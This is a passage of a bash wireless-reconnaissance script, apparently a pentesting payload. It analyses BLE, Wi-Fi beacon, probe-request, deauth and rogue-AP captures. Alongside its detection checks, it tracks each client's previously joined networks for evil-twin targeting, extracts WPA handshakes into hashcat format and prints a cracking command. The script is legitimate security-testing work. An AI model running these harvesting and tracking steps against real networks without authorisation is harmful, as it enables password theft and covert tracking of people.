                echo "  No BLE devices detected"
                echo ""
                echo "  Troubleshooting:"
                echo "    - Ensure Bluetooth adapter is powered on: hciconfig hci0 up"
                echo "    - Check adapter status: hciconfig"
                echo "    - Verify BLE devices are nearby and advertising"
                BLE_DEVICE_COUNT=0
            fi

            # Cleanup temp files
            rm -f /tmp/ble_scan_hci.txt /tmp/ble_raw.txt /tmp/ble_macs.txt

        # Method 2: Fallback to bluetoothctl if hcitool not available
        elif check_tool bluetoothctl; then
            echo "  [*] Using bluetoothctl for BLE scan..."

            # Create a bluetoothctl script
            cat > /tmp/bt_scan.sh << 'BTEOF'
#!/bin/bash
bluetoothctl << EOF
power on
scan on
EOF
sleep 28
bluetoothctl << EOF
scan off
devices
quit
EOF
BTEOF

            chmod +x /tmp/bt_scan.sh
            /tmp/bt_scan.sh > /tmp/ble_scan_btctl.txt 2>&1

            # Parse results
            ble_devices=$(grep "Device" /tmp/ble_scan_btctl.txt | grep -v "not available" | sort -u)

            if [ -n "$ble_devices" ]; then
                echo ""
                echo "$ble_devices" | while IFS= read -r line; do
                    mac=$(echo "$line" | awk '{print $2}')
                    name=$(echo "$line" | cut -d' ' -f3-)

                    echo "  BLE Device: $mac"
                    echo "    Name: ${name:-(Unknown)}"
                    echo ""
                done

                BLE_DEVICE_COUNT=$(echo "$ble_devices" | wc -l | tr -d ' ')
                echo "  Total BLE devices: $BLE_DEVICE_COUNT"
            else
                echo "  No BLE devices detected via bluetoothctl"
                BLE_DEVICE_COUNT=0
            fi

            rm -f /tmp/bt_scan.sh /tmp/ble_scan_btctl.txt
        else
            echo "  [!] ERROR: No BLE scan tools available"
            echo "  Required: hcitool or bluetoothctl"
            BLE_DEVICE_COUNT=0
        fi
        echo ""

        # Summary
        echo "═══════════════════════════════════════════════════════════════"
        echo "  BLUETOOTH SCAN SUMMARY"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""
        echo "  Classic Bluetooth Devices: ${BT_DEVICE_COUNT:-0}"
        echo "  BLE Devices: ${BLE_DEVICE_COUNT:-0}"
        TOTAL_BT=$((${BT_DEVICE_COUNT:-0} + ${BLE_DEVICE_COUNT:-0}))
        echo "  Total Bluetooth Devices: $TOTAL_BT"
        echo ""

        if [ "$TOTAL_BT" -gt 0 ]; then
            echo "  [*] Bluetooth devices detected in vicinity"
            echo "  [*] Consider investigating for:"
            echo "      - Unauthorized wireless peripherals"
            echo "      - IoT devices with default credentials"
            echo "      - Potential Bluetooth-based attacks"
        else
            echo "  [OK] No discoverable Bluetooth devices found"
        fi
        echo ""

    } > "${REPORT_DIR}/bluetooth/bluetooth_devices.txt"

    # Report results
    BT_TOTAL=$(grep "Total Bluetooth Devices:" "${REPORT_DIR}/bluetooth/bluetooth_devices.txt" 2>/dev/null | grep -oE '[0-9]+' | tail -1)
    BT_TOTAL=${BT_TOTAL:-0}

    if [ "$BT_TOTAL" -gt 0 ]; then
        LOG "    [OK] Bluetooth scan complete - ${BT_TOTAL} devices found"
    else
        LOG "    [OK] Bluetooth scan complete - no discoverable devices"
    fi
fi

# ============================================================================
# WIRELESS RECONNAISSANCE ANALYSIS
# ============================================================================

if [ "$ENABLE_WIRELESS_RECON" = true ]; then
    LOG "[*] Analyzing wireless reconnaissance data..."

    # Nearby Access Points (from beacons)
    {
        echo "=== NEARBY ACCESS POINTS ==="
        echo "Timestamp: $(date)"
        echo "Source: Beacon frame analysis"
        echo ""

        beacon_pcap="${REPORT_DIR}/pcaps/beacons_${TIMESTAMP}.pcap"
        if [ -f "$beacon_pcap" ]; then
            echo "Access Points Detected:"
            echo "========================"
            echo ""
            # Extract BSSID and SSID info from beacon frames
            tcpdump -e -r "$beacon_pcap" 2>/dev/null | \
                grep -oE "BSSID:[a-f0-9:]+|Beacon \([^)]+\)" | \
                paste - - 2>/dev/null | \
                sed 's/BSSID://g; s/Beacon (//g; s/)//g' | \
                sort | uniq -c | sort -rn | head -50 | \
                awk '{printf "  [%4d beacons] %s - %s\n", $1, $2, $3}'

            echo ""
            echo "Unique BSSIDs: $(tcpdump -e -r "$beacon_pcap" 2>/dev/null | grep -oE "BSSID:[a-f0-9:]+" | sort -u | wc -l | tr -d ' ')"

            # Channel distribution
            echo ""
            echo "Channel Distribution:"
            tcpdump -r "$beacon_pcap" -vv 2>/dev/null | \
                grep -oE "CH [0-9]+" | sort | uniq -c | sort -rn | \
                awk '{printf "  Channel %s: %d APs\n", $3, $1}'
        else
            echo "No beacon capture file found"
        fi
    } > "${REPORT_DIR}/analysis/nearby_access_points.txt"
    LOG "    [OK] Access point analysis complete"

    # Probe Requests (device fingerprinting)
    {
        echo "=== PROBE REQUEST ANALYSIS ==="
        echo "Timestamp: $(date)"
        echo "Source: Probe request frame analysis"
        echo ""
        echo "Probe requests reveal:"
        echo "  - Device MAC addresses (can identify device vendors)"
        echo "  - Networks devices are looking for (previously connected)"
        echo "  - Device activity patterns"
        echo ""

        probe_pcap="${REPORT_DIR}/pcaps/probe_requests_${TIMESTAMP}.pcap"
        if [ -f "$probe_pcap" ]; then
            # Extract device MACs sending probes
            echo "Devices Sending Probes:"
            echo "========================"
            tcpdump -e -r "$probe_pcap" 2>/dev/null | \
                grep -oE "SA:[a-f0-9:]+" | sed 's/SA://' | \
                sort | uniq -c | sort -rn | head -30 | \
                while read count mac; do
                    # Try to identify vendor from OUI
                    oui=$(echo "$mac" | cut -d: -f1-3 | tr '[:lower:]' '[:upper:]' | tr ':' '-')
                    printf "  [%4d probes] %s\n" "$count" "$mac"
                done

            echo ""
            echo "Networks Being Searched For (SSIDs):"
            echo "======================================"
            tcpdump -r "$probe_pcap" 2>/dev/null | \
                grep -oE "Probe Request \([^)]+\)" | \
                sed 's/Probe Request (//g; s/)//g' | \
                sort | uniq -c | sort -rn | head -30 | \
                awk '{if($2 != "") printf "  [%4d requests] %s\n", $1, $2; else printf "  [%4d requests] (Broadcast/Hidden)\n", $1}'

            echo ""
            echo "Statistics:"
            echo "  Total probe requests: $(tcpdump -r "$probe_pcap" 2>/dev/null | wc -l | tr -d ' ')"
            echo "  Unique devices: $(tcpdump -e -r "$probe_pcap" 2>/dev/null | grep -oE "SA:[a-f0-9:]+" | sort -u | wc -l | tr -d ' ')"
            echo "  Unique SSIDs probed: $(tcpdump -r "$probe_pcap" 2>/dev/null | grep -oE "Probe Request \([^)]+\)" | sort -u | wc -l | tr -d ' ')"
        else
            echo "No probe request capture file found"
        fi
    } > "${REPORT_DIR}/analysis/probe_requests.txt"
    LOG "    [OK] Probe request analysis complete"

    # Deauth/Disassoc Detection (attack detection)
    {
        echo "=== DEAUTHENTICATION/DISASSOCIATION DETECTION ==="
        echo "Timestamp: $(date)"
        echo ""
        echo "High volumes of deauth/disassoc frames may indicate:"
        echo "  - Active deauthentication attacks"
        echo "  - Evil twin attacks in progress"
        echo "  - WiFi jamming attempts"
        echo ""

        deauth_pcap="${REPORT_DIR}/pcaps/deauth_${TIMESTAMP}.pcap"
        if [ -f "$deauth_pcap" ]; then
            deauth_count=$(tcpdump -r "$deauth_pcap" 2>/dev/null | wc -l | tr -d ' ')

            if [ "$deauth_count" -gt 0 ]; then
                echo "[!] ALERT: $deauth_count deauth/disassoc frames detected!"
                echo ""

                echo "Deauth Sources (potential attackers):"
                echo "======================================="
                tcpdump -e -r "$deauth_pcap" 2>/dev/null | \
                    grep -oE "SA:[a-f0-9:]+" | sed 's/SA://' | \
                    sort | uniq -c | sort -rn | head -20 | \
                    awk '{printf "  [%4d frames] %s\n", $1, $2}'

                echo ""
                echo "Targeted BSSIDs:"
                echo "================"
                tcpdump -e -r "$deauth_pcap" 2>/dev/null | \
                    grep -oE "BSSID:[a-f0-9:]+" | sed 's/BSSID://' | \
                    sort | uniq -c | sort -rn | head -20 | \
                    awk '{printf "  [%4d frames] %s\n", $1, $2}'

                echo ""
                echo "Timeline (first and last seen):"
                echo "  First: $(tcpdump -r "$deauth_pcap" 2>/dev/null | head -1 | awk '{print $1}')"
                echo "  Last:  $(tcpdump -r "$deauth_pcap" 2>/dev/null | tail -1 | awk '{print $1}')"

                # Check for attack patterns (>10 deauths to same target)
                echo ""
                echo "Potential Attack Patterns:"
                tcpdump -e -r "$deauth_pcap" 2>/dev/null | \
                    grep -oE "BSSID:[a-f0-9:]+" | sed 's/BSSID://' | \
                    sort | uniq -c | sort -rn | \
                    awk '$1 > 10 {printf "  [!] %s received %d deauth frames (SUSPICIOUS)\n", $2, $1}'
            else
                echo "[OK] No deauthentication frames detected"
                echo "    The wireless environment appears normal"
            fi
        else
            echo "No deauth capture file found"
        fi
    } > "${REPORT_DIR}/analysis/deauth_detection.txt"

    # Add to severity scoring for deauth attacks
    DEAUTH_ALERT=$(grep -c "\[!\] ALERT:" "${REPORT_DIR}/analysis/deauth_detection.txt" 2>/dev/null); DEAUTH_ALERT=${DEAUTH_ALERT:-0}
    if [ "$DEAUTH_ALERT" -gt 0 ]; then
        add_finding "CRITICAL" "Deauthentication attack detected - possible WiFi jamming or Evil Twin setup"
    fi

    LOG "    [OK] Deauth detection analysis complete"

    # Full wireless traffic summary
    {
        echo "=== WIRELESS RECONNAISSANCE SUMMARY ==="
        echo "Timestamp: $(date)"
        echo "Capture Duration: ${PCAP_TIME} seconds"
        echo ""

        recon_pcap="${REPORT_DIR}/pcaps/wireless_recon_${TIMESTAMP}.pcap"
        if [ -f "$recon_pcap" ]; then
            echo "Total Wireless Frames Captured: $(tcpdump -r "$recon_pcap" 2>/dev/null | wc -l | tr -d ' ')"
            echo ""

            echo "Frame Type Distribution:"
            echo "========================"
            echo -n "  Management frames: "
            tcpdump -r "$recon_pcap" 'type mgt' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Control frames: "
            tcpdump -r "$recon_pcap" 'type ctl' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Data frames: "
            tcpdump -r "$recon_pcap" 'type data' 2>/dev/null | wc -l | tr -d ' '
            echo ""

            echo "Management Frame Breakdown:"
            echo "==========================="
            echo -n "  Beacons: "
            tcpdump -r "$recon_pcap" 'type mgt subtype beacon' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Probe Requests: "
            tcpdump -r "$recon_pcap" 'type mgt subtype probe-req' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Probe Responses: "
            tcpdump -r "$recon_pcap" 'type mgt subtype probe-resp' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Authentication: "
            tcpdump -r "$recon_pcap" 'type mgt subtype auth' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Deauthentication: "
            tcpdump -r "$recon_pcap" 'type mgt subtype deauth' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Association Req: "
            tcpdump -r "$recon_pcap" 'type mgt subtype assoc-req' 2>/dev/null | wc -l | tr -d ' '
            echo -n "  Association Resp: "
            tcpdump -r "$recon_pcap" 'type mgt subtype assoc-resp' 2>/dev/null | wc -l | tr -d ' '
        else
            echo "No wireless recon capture file found"
        fi
    } > "${REPORT_DIR}/analysis/wireless_recon_summary.txt"
    LOG "    [OK] Wireless recon summary complete"

    LOG ""
fi

# ============================================================================
# WIFI SECURITY ANALYSIS (PENTESTING INTELLIGENCE)
# ============================================================================

if [ "$ENABLE_WIFI_SECURITY_ANALYSIS" = true ]; then
    LOG ""
    LOG "[*] Performing WiFi security analysis..."
    LOG "    This analyzes captured 802.11 frames for pentesting intelligence"

    # Create security analysis directory
    mkdir -p "${REPORT_DIR}/security_analysis"

    # Main wireless recon pcap (contains all frames)
    MAIN_PCAP="${REPORT_DIR}/pcaps/wireless_recon_${TIMESTAMP}.pcap"
    PROBE_PCAP="${REPORT_DIR}/pcaps/probe_requests_${TIMESTAMP}.pcap"
    BEACON_PCAP="${REPORT_DIR}/pcaps/beacons_${TIMESTAMP}.pcap"
    DEAUTH_PCAP="${REPORT_DIR}/pcaps/deauth_${TIMESTAMP}.pcap"

    if [ -f "$MAIN_PCAP" ]; then

        # ========================================================================
        # 1. CLIENT PROBE REQUEST INTELLIGENCE
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  CLIENT PROBE REQUEST INTELLIGENCE"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  Probe requests reveal networks that clients have previously"
            echo "  connected to. This can expose:"
            echo "    - Home/work network names"
            echo "    - Previously visited locations (airports, hotels, cafes)"
            echo "    - Corporate network SSIDs"
            echo "    - Device tracking across time/location"
            echo ""
            echo "PENTESTING VALUE:"
            echo "  - Social engineering targets (create evil twin of home network)"
            echo "  - Physical location tracking"
            echo "  - Corporate reconnaissance"
            echo ""

            if check_tool tcpdump && [ -f "$MAIN_PCAP" ]; then
                echo "═══════════════════════════════════════════════════════════════"
                echo "  NETWORKS CLIENTS ARE SEARCHING FOR"
                echo "═══════════════════════════════════════════════════════════════"
                echo ""

                # Extract probe requests using tcpdump
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype probe-req' 2>/dev/null | \
                    awk '
                    /SA:/ {
                        # Extract source MAC
                        for (i=1; i<=NF; i++) {
                            if ($i ~ /^SA:/) {
                                mac = $i
                                sub(/SA:/, "", mac)
                            }
                        }
                    }
                    /Probe Request \(/ {
                        # Extract SSID from probe request
                        ssid = $0
                        sub(/.*Probe Request \(/, "", ssid)
                        sub(/\).*/, "", ssid)
                        if (ssid != "" && mac != "") {
                            print mac, ssid
                        }
                    }
                    ' > /tmp/probe_analysis.txt

                if [ -s /tmp/probe_analysis.txt ]; then
                    # Group by SSID and show which clients are looking for it
                    echo "Networks Being Searched (Sorted by Popularity):"
                    echo "────────────────────────────────────────────────────────────"
                    awk '{
                        mac = $1
                        ssid = $2
                        for (i=3; i<=NF; i++) ssid = ssid " " $i

                        ssid_macs[ssid][mac] = 1
                        ssid_count[ssid]++
                    }
                    END {
                        for (ssid in ssid_count) {
                            client_count = 0
                            for (mac in ssid_macs[ssid]) client_count++
                            printf "  [%4d probes] [%2d clients] %s\n", \
                                ssid_count[ssid], client_count, ssid
                        }
                    }' /tmp/probe_analysis.txt | sort -rn -t']' -k1

                    echo ""
                    echo "═══════════════════════════════════════════════════════════════"
                    echo "  CLIENT DEVICE TRACKING"
                    echo "═══════════════════════════════════════════════════════════════"
                    echo ""
                    echo "Devices and Networks They've Connected To:"
                    echo "────────────────────────────────────────────────────────────"

                    # Show which networks each client is looking for
                    awk '{
                        mac = $1
                        ssid = $2
                        for (i=3; i<=NF; i++) ssid = ssid " " $i

                        if (mac != "" && ssid != "") {
                            mac_ssids[mac][ssid] = 1
                            mac_count[mac]++
                        }
                    }
                    END {
                        for (mac in mac_count) {
                            # Try to get vendor using whoismac if available
                            printf "\n  Client: %s (%d networks)\n", mac, mac_count[mac]
                            printf "  ────────────────────────────────────────────────────\n"
                            for (ssid in mac_ssids[mac]) {
                                printf "    → %s\n", ssid
                            }
                        }
                    }' /tmp/probe_analysis.txt | head -100

                    echo ""
                    echo "STATISTICS:"
                    echo "  Total Probe Requests: $(wc -l < /tmp/probe_analysis.txt | tr -d ' ')"
                    echo "  Unique Clients: $(awk '{print $1}' /tmp/probe_analysis.txt | sort -u | wc -l | tr -d ' ')"
                    echo "  Unique SSIDs Probed: $(awk '{print $2}' /tmp/probe_analysis.txt | sort -u | wc -l | tr -d ' ')"

                    # Cleanup
                    rm -f /tmp/probe_analysis.txt
                else
                    echo "No probe requests with SSIDs captured"
                    echo "(Clients may be using randomized MACs or not actively probing)"
                fi
            else
                echo "[!] tcpdump not available or no capture file"
            fi

        } > "${REPORT_DIR}/security_analysis/01_client_probe_intelligence.txt"
        LOG "    [OK] Client probe analysis complete"

        # ========================================================================
        # 2. HIDDEN SSID DETECTION
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  HIDDEN SSID DETECTION"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  Some APs broadcast with blank/hidden SSIDs (security through"
            echo "  obscurity). These can still be detected and the real SSID can"
            echo "  often be revealed through probe responses or association frames."
            echo ""
            echo "PENTESTING VALUE:"
            echo "  - Identify networks trying to hide"
            echo "  - De-cloak hidden SSIDs through client associations"
            echo ""

            if check_tool tcpdump; then
                # Find beacons with blank SSIDs using tcpdump
                echo "Access Points with Hidden SSIDs:"
                echo "────────────────────────────────────────────────────────────"

                # Parse beacons for hidden (empty) SSIDs
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype beacon' 2>/dev/null | \
                    awk '
                    /BSSID:/ { bssid = $NF }
                    /Beacon \(\)/ {
                        # Empty SSID = hidden network
                        if (bssid != "" && !seen[bssid]++) {
                            printf "  BSSID: %s\n", bssid
                            printf "    SSID: (Hidden/Blank)\n"
                            printf "    Status: May be revealed via probe response\n\n"
                        }
                    }'

                # Try to find the real SSID from probe responses
                echo ""
                echo "Attempting to De-cloak Hidden SSIDs:"
                echo "────────────────────────────────────────────────────────────"

                # Get probe responses that might reveal hidden SSIDs
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype probe-resp' 2>/dev/null | \
                    awk '
                    /BSSID:/ { bssid = $NF }
                    /Probe Response \(/ {
                        ssid = $0
                        sub(/.*Probe Response \(/, "", ssid)
                        sub(/\).*/, "", ssid)
                        if (bssid != "" && ssid != "" && !seen[bssid]++) {
                            printf "  %s → SSID: %s (revealed)\n", bssid, ssid
                        }
                    }'

                # Count hidden SSIDs
                hidden_count=$(tcpdump -r "$MAIN_PCAP" -e 'type mgt subtype beacon' 2>/dev/null | \
                    grep "Beacon ()" | grep -oE "BSSID:[0-9a-f:]+" | sort -u | wc -l | tr -d ' ')

                echo ""
                echo "STATISTICS:"
                echo "  Hidden SSIDs Detected: ${hidden_count:-0}"
            else
                echo "[!] tcpdump not available"
            fi

        } > "${REPORT_DIR}/security_analysis/02_hidden_ssid_detection.txt"
        LOG "    [OK] Hidden SSID detection complete"

        # ========================================================================
        # 3. WPA HANDSHAKE DETECTION
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  WPA/WPA2/WPA3 HANDSHAKE DETECTION"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  WPA handshakes (EAPOL 4-way handshake) occur when clients"
            echo "  connect to WPA/WPA2/WPA3 networks. Capturing the full handshake"
            echo "  allows for offline password auditing."
            echo ""
            echo "PENTESTING VALUE:"
            echo "  - Captured handshakes can be cracked offline with:"
            echo "    • hashcat (GPU-accelerated)"
            echo "    • aircrack-ng"
            echo "    • john the ripper"
            echo "  - Does NOT require deauthentication attacks (passive capture)"
            echo "  - Can audit password strength of authorized networks"
            echo ""

            if check_tool hcxpcapngtool; then
                # Use hcxpcapngtool to extract WPA handshakes
                echo "WPA Handshake Analysis (via hcxpcapngtool):"
                echo "────────────────────────────────────────────────────────────"

                # Convert pcap and extract handshakes to hashcat format
                HASH_FILE="/tmp/handshakes_$$.22000"
                hcxpcapngtool -o "$HASH_FILE" "$MAIN_PCAP" 2>/tmp/hcx_output.txt

                # Parse hcxpcapngtool output for statistics
                if [ -s /tmp/hcx_output.txt ]; then
                    echo ""
                    echo "Capture Analysis:"
                    grep -E "EAPOL|handshake|PMKID|network" /tmp/hcx_output.txt | head -20
                    echo ""
                fi

                if [ -s "$HASH_FILE" ]; then
                    hash_count=$(wc -l < "$HASH_FILE" | tr -d ' ')
                    unique_networks=$(cut -d'*' -f4 "$HASH_FILE" 2>/dev/null | sort -u | wc -l | tr -d ' ')

                    echo "═══════════════════════════════════════════════════════════════"
                    echo "  CAPTURED HANDSHAKES"
                    echo "═══════════════════════════════════════════════════════════════"
                    echo ""
                    echo "  Total Hashes Extracted: $hash_count"
                    echo "  Unique Networks: $unique_networks"
                    echo ""

                    echo "Networks with Captured Handshakes:"
                    echo "────────────────────────────────────────────────────────────"
                    # Parse the 22000 format: WPA*TYPE*PMKID/MIC*MAC_AP*MAC_CLIENT*ESSID*...
                    awk -F'*' '{
                        if (NF >= 6) {
                            essid_hex = $6
                            bssid = $4
                            # Convert hex ESSID to ASCII
                            cmd = "echo " essid_hex " | xxd -r -p 2>/dev/null"
                            cmd | getline essid
                            close(cmd)
                            if (essid == "") essid = "(hidden)"
                            printf "  ✓ SSID: %-30s BSSID: %s\n", essid, bssid
                        }
                    }' "$HASH_FILE" | sort -u

                    echo ""
                    echo "[!] PENTESTING NOTE:"
                    echo "  Handshakes ready for cracking!"
                    echo "  Hash file: $HASH_FILE"
                    echo "  Crack with: hashcat -m 22000 $HASH_FILE wordlist.txt"
                    echo ""

                    # Copy hash file to report
                    cp "$HASH_FILE" "${REPORT_DIR}/security_analysis/captured_handshakes.22000" 2>/dev/null
                    echo "  Hash file saved to: security_analysis/captured_handshakes.22000"
                else
                    echo "No WPA handshakes captured"
                    echo ""
                    echo "This means:"
                    echo "  - No clients connected during capture window"
                    echo "  - Only already-associated clients present"
                    echo "  - Need longer capture or wait for new connections"
                fi

                # Cleanup
                rm -f "$HASH_FILE" /tmp/hcx_output.txt

            elif check_tool tcpdump; then
                # Fallback: Use tcpdump to detect EAPOL frames
                echo "WPA Handshake Detection (via tcpdump):"
                echo "────────────────────────────────────────────────────────────"

                eapol_count=$(tcpdump -r "$MAIN_PCAP" -nn 'ether proto 0x888e' 2>/dev/null | wc -l | tr -d ' ')

                if [ "$eapol_count" -gt 0 ]; then
                    echo "  EAPOL Frames Detected: $eapol_count"
                    echo ""
                    echo "  EAPOL Frame Summary:"
                    tcpdump -r "$MAIN_PCAP" -nn 'ether proto 0x888e' 2>/dev/null | head -20

                    if [ "$eapol_count" -ge 4 ]; then
                        echo ""
                        echo "[!] Potential complete handshakes present!"
                        echo "  Use hcxpcapngtool for extraction (install if needed)"
                    fi
                else
                    echo "No EAPOL frames detected"
                fi
            else
                echo "[!] hcxpcapngtool and tcpdump not available"
            fi

        } > "${REPORT_DIR}/security_analysis/03_wpa_handshake_detection.txt"
        LOG "    [OK] WPA handshake detection complete"

        # ========================================================================
        # 4. ENCRYPTION WEAKNESS ANALYSIS
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  ENCRYPTION WEAKNESS ANALYSIS"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  Analyzes encryption methods used by access points to identify"
            echo "  weak/vulnerable configurations."
            echo ""
            echo "VULNERABILITY RATINGS:"
            echo "  CRITICAL - WEP (trivially crackable in minutes)"
            echo "  HIGH     - WPA with TKIP (deprecated, vulnerable)"
            echo "  HIGH     - WPS Enabled (vulnerable to brute force)"
            echo "  MEDIUM   - WPA2 with weak PSK"
            echo "  LOW      - WPA2/WPA3 with CCMP/AES"
            echo ""

            if check_tool tcpdump; then
                echo "═══════════════════════════════════════════════════════════════"
                echo "  ENCRYPTION TYPE BREAKDOWN"
                echo "═══════════════════════════════════════════════════════════════"
                echo ""

                # Extract beacon info using tcpdump
                # Parse verbose output for encryption flags
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype beacon' 2>/dev/null > /tmp/beacon_dump.txt

                if [ -s /tmp/beacon_dump.txt ]; then
                    # Parse beacons for encryption analysis
                    awk '
                    /Beacon \(/ {
                        # Start of new beacon
                        if (bssid != "") {
                            # Save previous beacon
                            beacons[bssid] = ssid "|" privacy "|" wpa "|" wpa2 "|" wps
                        }
                        # Extract SSID from Beacon line
                        ssid = $0
                        sub(/.*Beacon \(/, "", ssid)
                        sub(/\).*/, "", ssid)
                        if (ssid == "") ssid = "(hidden)"
                        privacy = 0; wpa = 0; wpa2 = 0; wps = 0; bssid = ""
                    }
                    /BSSID:/ { bssid = $NF }
                    /PRIVACY/ { privacy = 1 }
                    /WPA/ { wpa = 1 }
                    /RSN/ { wpa2 = 1 }
                    /WPS/ { wps = 1 }
                    END {
                        if (bssid != "") {
                            beacons[bssid] = ssid "|" privacy "|" wpa "|" wpa2 "|" wps
                        }
                        # Output collected data
                        for (b in beacons) {
                            print b "|" beacons[b]
                        }
                    }' /tmp/beacon_dump.txt > /tmp/encryption_parsed.txt

                    # Count totals
                    total_aps=$(wc -l < /tmp/encryption_parsed.txt | tr -d ' ')
                    open_count=0
                    wep_count=0
                    wpa_count=0
                    wpa2_count=0
                    wps_count=0

                    echo "[CRITICAL VULNERABILITIES]"
                    echo "────────────────────────────────────────────────────────────"

                    # Check for Open networks (PRIVACY=0)
                    while IFS='|' read -r bssid ssid privacy wpa wpa2 wps; do
                        if [ "$privacy" = "0" ]; then
                            echo "  [OPEN] SSID: $ssid - BSSID: $bssid"
                            echo "         ⚠ NO ENCRYPTION - Data transmitted in cleartext!"
                            open_count=$((open_count + 1))
                        fi
                    done < /tmp/encryption_parsed.txt

                    # Check for WEP (has PRIVACY but no WPA/WPA2)
                    while IFS='|' read -r bssid ssid privacy wpa wpa2 wps; do
                        if [ "$privacy" = "1" ] && [ "$wpa" = "0" ] && [ "$wpa2" = "0" ]; then
                            echo "  [WEP] SSID: $ssid - BSSID: $bssid"
                            echo "        ⚠ WEP is TRIVIALLY CRACKABLE - Do not use!"
                            wep_count=$((wep_count + 1))
                        fi
                    done < /tmp/encryption_parsed.txt

                    if [ "$open_count" -eq 0 ] && [ "$wep_count" -eq 0 ]; then
                        echo "  ✓ No critical vulnerabilities detected"
                    fi

                    echo ""
                    echo "[HIGH RISK CONFIGURATIONS]"
                    echo "────────────────────────────────────────────────────────────"

                    # Check for WPS enabled
                    while IFS='|' read -r bssid ssid privacy wpa wpa2 wps; do
                        if [ "$wps" = "1" ]; then
                            echo "  [WPS ENABLED] $ssid - $bssid"
                            echo "                ⚠ Vulnerable to WPS PIN brute force (Reaver/Pixie Dust)"
                            wps_count=$((wps_count + 1))
                        fi
                    done < /tmp/encryption_parsed.txt

                    if [ "$wps_count" -eq 0 ]; then
                        echo "  ✓ No WPS-enabled networks detected"
                    fi

                    echo ""
                    echo "[SECURE CONFIGURATIONS]"
                    echo "────────────────────────────────────────────────────────────"

                    # Count WPA/WPA2 networks
                    while IFS='|' read -r bssid ssid privacy wpa wpa2 wps; do
                        if [ "$wpa2" = "1" ]; then
                            wpa2_count=$((wpa2_count + 1))
                        elif [ "$wpa" = "1" ]; then
                            wpa_count=$((wpa_count + 1))
                        fi
                    done < /tmp/encryption_parsed.txt

                    echo "  WPA2/WPA3 Networks: $wpa2_count"
                    echo "  WPA Networks: $wpa_count"

                    echo ""
                    echo "SUMMARY:"
                    echo "  Total Access Points Analyzed: $total_aps"
                    echo "  Security Level Distribution:"
                    echo "    ✓ Secure (WPA2/WPA3): $wpa2_count"
                    echo "    ~ Legacy (WPA): $wpa_count"
                    echo "    ⚠ WPS Enabled: $wps_count"
                    echo "    ✗ Open Networks: $open_count"
                    echo "    ✗ WEP Networks: $wep_count"

                    # Cleanup
                    rm -f /tmp/beacon_dump.txt /tmp/encryption_parsed.txt
                else
                    echo "No beacon data captured"
                fi
            else
                echo "[!] tcpdump not available"
            fi

        } > "${REPORT_DIR}/security_analysis/04_encryption_analysis.txt"
        LOG "    [OK] Encryption analysis complete"

        # ========================================================================
        # 5. ROGUE AP DETECTION
        # ========================================================================
        {
            echo "═══════════════════════════════════════════════════════════════"
            echo "  ROGUE ACCESS POINT DETECTION"
            echo "═══════════════════════════════════════════════════════════════"
            echo "Timestamp: $(date)"
            echo ""
            echo "DESCRIPTION:"
            echo "  Detects multiple BSSIDs broadcasting the same SSID. This could"
            echo "  indicate:"
            echo "    - Legitimate: Multiple APs in same network (roaming)"
            echo "    - Malicious: Evil Twin attack (rogue AP impersonating real one)"
            echo "    - Suspicious: Karma/Honeypot attacks"
            echo ""
            echo "PENTESTING VALUE:"
            echo "  - Identify potential evil twin attacks in progress"
            echo "  - Detect honeypot APs"
            echo "  - Map enterprise networks (multiple APs, same SSID)"
            echo ""

            if check_tool tcpdump; then
                echo "Networks with Multiple BSSIDs (Potential Rogues):"
                echo "────────────────────────────────────────────────────────────"

                # Extract SSID and BSSID pairs using tcpdump
                tcpdump -r "$MAIN_PCAP" -e -v 'type mgt subtype beacon' 2>/dev/null | \
                    awk '
                    /BSSID:/ { bssid = $NF }
                    /Beacon \(/ {
                        ssid = $0
                        sub(/.*Beacon \(/, "", ssid)
                        sub(/\).*/, "", ssid)
                        if (ssid != "" && bssid != "") {
                            print ssid, bssid
                        }
                    }' | sort -u > /tmp/rogue_detection.txt

                if [ -s /tmp/rogue_detection.txt ]; then
                    # Find SSIDs with multiple BSSIDs
                    awk '{
                        bssid = $NF
                        ssid = $0
                        sub(/ [^ ]+$/, "", ssid)

                        if (ssid != "" && bssid != "") {
                            bssids[ssid][bssid] = 1
                            count[ssid]++
                        }
                    }
                    END {
                        for (ssid in count) {
                            bssid_count = 0
                            for (b in bssids[ssid]) bssid_count++

                            if (bssid_count > 1) {
                                printf "\n  SSID: \"%s\" (%d different BSSIDs)\n", ssid, bssid_count
                                printf "  ────────────────────────────────────────────────────\n"

                                for (bssid in bssids[ssid]) {
                                    printf "    → BSSID: %s\n", bssid
                                }

                                if (bssid_count == 2) {
                                    printf "  ⚠ WARNING: Could be evil twin attack!\n"
                                } else if (bssid_count > 2 && bssid_count < 10) {
                                    printf "  ℹ INFO: Likely enterprise network with multiple APs\n"
                                } else if (bssid_count >= 10) {
                                    printf "  ℹ INFO: Large deployment or mesh network\n"
                                }
                            }
                        }
                    }' /tmp/rogue_detection.txt

                    echo ""
                    echo "STATISTICS:"
                    duplicate_ssids=$(awk '{
                        bssid = $NF; ssid = $0; sub(/ [^ ]+$/, "", ssid)
                        if(ssid!="" && bssid!="") {bssids[ssid][bssid]=1}
                    } END {
                        dup=0
                        for(s in bssids) {
